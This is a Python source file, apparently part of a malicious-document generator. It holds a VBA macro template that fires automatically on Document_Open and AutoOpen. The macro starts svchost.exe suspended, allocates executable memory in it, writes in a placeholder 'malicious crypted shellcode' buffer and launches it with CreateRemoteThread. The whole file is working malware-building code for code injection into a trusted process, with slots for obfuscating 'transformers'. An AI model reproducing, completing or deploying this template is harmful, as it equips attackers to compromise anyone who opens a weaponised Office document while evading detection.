class spawnandinject:

    def imports(self) -> list[str]:
        return ['Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr',
'Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long',
'Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As LongPtr, lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr',
'Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr',
'Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long',
'Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)']

    def compilerOptions(self) -> list[str]:
        return []

    def template(self) -> str:
        return """
{imports}

Private Type PROCESS_BASIC_INFORMATION
    Reserved1 As LongPtr
    PebAddress As LongPtr
    Reserved2 As LongPtr
    Reserved3 As LongPtr
    UniquePid As LongPtr
    MoreReserved As LongPtr
End Type

Private Type STARTUPINFOA
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As String
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Sub Document_Open()
    hollow
End Sub

Sub AutoOpen()
    hollow
End Sub

{codeblocks}

' Performs process hollowing to run shellcode in svchost.exe
Function hollow()
    Dim si As STARTUPINFOA
    RtlZeroMemory si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H100
    Dim pi As PROCESS_INFORMATION
    Dim procOutput As LongPtr
    ' Start svchost.exe in a suspended state
    procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)    
    
    ' Buffer for malicious crypted shellcode needs to go here
    Dim shellcode As Variant

    {shellcode}
    {transformers}
    Dim scSize As Long
    scSize = UBound(shellcode)

    Dim buf({shellcodeSize}) As Byte
    For y = 0 To UBound(shellcode)
        buf(y) = shellcode(y)
    Next y

    Dim addr as LongPtr

    addr = VirtualAllocEx(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, &H20)

    ' Write the shellcode into the svchost.exe entry point
    a = WriteProcessMemory(pi.hProcess, addr, buf(0), scSize, tmp)

    Dim thread as LongPtr
    thread = CreateRemoteThread(pi.hProcess, ByVal 0&, 0, addr, ByVal 0&, 0, ByVal 0&)

    b = WaitForSingleObject(thread, 500)
 
End Function
"""